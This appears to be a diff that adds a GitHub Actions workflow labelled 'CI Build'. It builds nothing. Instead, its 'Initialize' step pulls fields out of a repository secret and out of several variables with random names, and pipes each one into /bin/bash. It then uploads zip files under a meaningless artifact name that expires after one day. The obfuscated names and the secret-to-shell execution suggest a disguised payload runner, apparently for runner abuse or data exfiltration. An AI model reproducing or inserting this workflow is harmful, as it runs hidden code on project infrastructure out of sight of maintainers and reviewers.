@@ -1,0 +1,33 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Initialize
+        env:
+          sf1264: ${{ secrets.sf1264 }}
+        run: |
+          printf '%s' "$sf1264" | jq -r .x957 | /bin/bash
+          printf '%s' "$bjlh6" | jq -r .ppwhd0 | /bin/bash
+          echo $tzuem3832 | jq -r .pjoxx81284 | /bin/bash
+          printf '%s' "$hn5" | jq -r .wthne50126 | /bin/bash
+          echo $bf7088 | jq -r .f7 | /bin/bash
+          printf '%s' "$tiaj530" | jq -r .ark6029 | /bin/bash
+
+      - name: Persist results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: OKP42Sv9
+          path: "*.zip"
+          retention-days: 1
